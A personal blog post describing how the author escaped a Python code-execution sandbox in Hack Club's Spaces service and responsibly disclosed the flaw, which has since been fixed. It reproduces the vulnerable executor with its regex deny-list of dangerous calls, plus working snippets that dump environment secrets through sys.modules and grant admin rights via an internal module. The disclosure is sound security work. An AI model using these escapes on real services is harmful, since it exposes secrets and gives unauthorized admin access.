---
title: "Here’s how I got full admin rights in a Replit clone"
description: "Be careful how you run untrusted code!"
pubDate: "May 21, 2025 18:00"
draft: false
tags: ["python", "cybersec", "hackclub"]
---

At [Hack Club](https://hackclub.com), folks often want to get started coding without having a full coding environment installed on their computer (or simply can’t install one!) In the past, [Replit](https://replit.com) was the main tool used, but since their [significant nerfing of their free plan](https://www.reddit.com/r/replit/comments/1ezf9zd/huge_changes_to_free_plan/), it’s simply nonviable for most people who want to use it.

One of the ways Hack Club decided to tackle this was to build a version of their own called [Spaces](https://spaces.hackclub.com). The premise is simple -- it’s just Replit but completely free. I was interested in seeing if there were any vulnerabilities I could exploit in Spaces, so I decided to play around with it and see how it works.

## How it works

Spaces is a Python application and had two different types of spaces:

- A *web space*, where you can create static HTML/CSS/JS sites
- A *Python space*, where you can write Python code and execute it (go figure)

Python spaces seemed like the most promising candidate for a vulnerability, so I decided to see how it executes the code:

```python
def run_python(site_id):
    try:
        site = Site.query.get_or_404(site_id)
        data = request.get_json()
        code = data.get('code', '')

        import sys
        import json
        import re
        from io import StringIO
        from ast import parse, Import, ImportFrom, Call, Attribute, Name

        with open('allowed_imports.json') as f:
            allowed = json.load(f)['allowed_imports']

        dangerous_patterns = [
            r'__import__\s*\(', r'eval\s*\(', r'exec\s*\(', r'globals\s*\(',
            r'locals\s*\(', r'getattr\s*\(', r'setattr\s*\(', r'delattr\s*\(',
            r'compile\s*\(', r'open\s*\(', r'os\.system\s*\(', r'subprocess',
            r'count\s*\(', r'while\s+True',
            r'for\s+.*\s+in\s+range\s*\(\s*[0-9]{7,}\s*\)',
            r'set\s*\(\s*.*\.count\(\s*0\s*\)\s*\)'
        ]

        for pattern in dangerous_patterns:
            if re.search(pattern, code):
                return jsonify({
                    'output':
                    'SecurityError: Potentially harmful operation detected',
                    'error': True
                }), 400

        try:
            tree = parse(code)
            for node in tree.body:
                if isinstance(node, (Import, ImportFrom)):
                    module = node.module if isinstance(
                        node, ImportFrom) else node.names[0].name
                    base_module = module.split('.')[0]
                    if base_module not in allowed:
                        return jsonify({
                            'output':
                            f'ImportError: module {base_module} is not allowed. Allowed modules are: {", ".join(allowed)}',
                            'error': True
                        }), 400

                if isinstance(node, Call) and hasattr(
                        node.func, 'id') and node.func.id in [
                            'eval', 'exec', '__import__'
                        ]:
                    return jsonify({
                        'output':
                        'SecurityError: Potentially harmful function call detected',
                        'error': True
                    }), 
        except:
	          print("Error") # abbreviated
```

Wait, *what?*

Spaces was filtering based off dangerous imports, rather than using Docker or some other containment mechanism. That set off alarm bells immediately, so I decided to see which imports were allowed:

```json

{
  "allowed_imports": [
    "math",
    "random",
    "datetime",
    "json",
    "collections",
    "re",
    "string",
    "functools",
    "time",
    "statistics",
    "decimal",
    "fractions",
    "os.path",
    "sys",
    "csv"
  ]
}
```

`sys` looked interesting, but importing it directly didn’t work (something about `__import__` not being defined), so I decided to see how it was running the code itself:

```python
old_stdout = sys.stdout
redirected_output = StringIO()
sys.stdout = redirected_output

import threading
import builtins
import _thread
class ThreadWithException(threading.Thread):
    def __init__(self, target=None, args=()):
        threading.Thread.__init__(self, target=target, args=args)
        self.exception = None
        self.result = None
    def run(self):
        try:
            if self._target:
                self.result = self._target(*self._args)
        except Exception as e:
            self.exception = e
def execute_with_timeout(code_to_execute,
                         restricted_globals,
                         timeout=5):
    def exec_target():
        exec(code_to_execute, restricted_globals)
    execution_thread = ThreadWithException(target=exec_target)
    execution_thread.daemon = True
    execution_thread.start()
    execution_thread.join(timeout)
    if execution_thread.is_alive():
        _thread.interrupt_main()
        raise TimeoutError(
            "Code execution timed out (maximum 5 seconds allowed)")
    if execution_thread.exception:
        raise execution_thread.exception
try:
    safe_builtins = {}
    for name in dir(builtins):
        if name not in [
                'eval', 'exec', 'compile', '__import__', 'open',
                'input', 'memoryview', 'globals', 'locals'
        ]:
            safe_builtins[name] = getattr(builtins, name)
    restricted_globals = {'__builtins__': safe_builtins}
    for module_name in allowed:
        try:
            module = __import__(module_name)
            restricted_globals[module_name] = module
        except ImportError:
            pass
    execute_with_timeout(code, restricted_globals, timeout=5)
    output = redirected_output.getvalue()
    if not output.strip():
        output = "Code executed successfully, but produced no output. Add print() statements to see results."
    return jsonify({'output': output})
except TimeoutError as e:
    return jsonify({'output': str(e), 'error': True}), 400
except Exception as e:
    error_type = type(e).__name__
		# ...
finally:
    sys.stdout = old_stdout
```

*(note that both code blocks from above have had a bit of logic removed (mainly to do with error handling and things like that))*

Sure enough, it was just running the code directly within Spaces’ Python process. I decided to see if this was exploitable by writing a bit of code to see if I could dump Spaces’ env vars:

```python
def main():
    os_mod = sys.modules['os']
    env = os_mod.environ
    print(env)
main()
```

```python
environ({'GITHUB_CALLBACK_URL': '[redacted]', 'GITHUB_CLIENT_SECRET': '[redacted]', 'DATABASE_URL': '[redacted]', 'GROQ_API_KEY': 'gsk_[redacted]', 'GITHUB_CLIENT_ID': 'Ov23liPtaMsNRLw66vxr', 'SLACK_CLIENT_SECRET': '[redacted]', 'SLACK_CLIENT_ID': '2210535565.8465855857699'})
```

Bingo.

This on its own was pretty interesting - I had access to the GitHub and Slack client secrets and the Groq API key. However, the database URL was an internal one that didn’t accept connections from the wider internet, so I decided to see if I could try and get admin access to the site so I could look at things like club data. This was a bit more complex than just dumping the environment variables, but I was able to make it work:

```python
app_obj = None
# Importing Flask wasn't allowed by the import checker,
# and sys.modules["flask"] didn't work either, so we just scan the
# loaded modules to find the Flask class
for module in sys.modules.values():
    if hasattr(module, 'app'):
        candidate = module.app
        if type(candidate).__name__ == 'Flask':
            app_obj = candidate
            break

# `admin_utils` is an internal module that deals with admin stuff (who could've guessed :P)
admin_utils = sys.modules['admin_utils']
with app_obj.app_context():
    admin_utils.add_admin("sec")
    
# We need this to be there so we don't get errors
def main():
    print("Woah?")
main()
```

I ran the code, reloaded the page, and sure enough, I had admin access:

![A screenshot of Spaces' admin panel](https://hc-cdn.hel1.your-objectstorage.com/s/v3/1dfad3be3d7b7bb1f31d6cd3ed986ed019439b0a_image.png)

Very nice.

## Responsible disclosure

To Hack Club’s credit, this was fixed surprisingly quickly. Spaces was moved off the old execution model, and now uses [Piston](https://github.com/engineer-man/piston), which uses [Isolate](https://www.ucw.cz/isolate/isolate.1.html) within Docker for code execution.

*(these times are in British Summer Time)*

- **11/05/2025** at 1:37PM: Spaces team notified
- **11/05/2025** at 1:50PM: Spaces team confirmed the issue
- **20/05/2025** at 12:46PM: Spaces v2 released, which uses Piston and thus fixes this vulnerability

In other words, getting this fixed took just over a week. Nice work!

---

Thanks for making it to the end of this blog post! Check out [my other posts](https://skyfall.dev/posts) if you’d like to see what else I’ve written :)
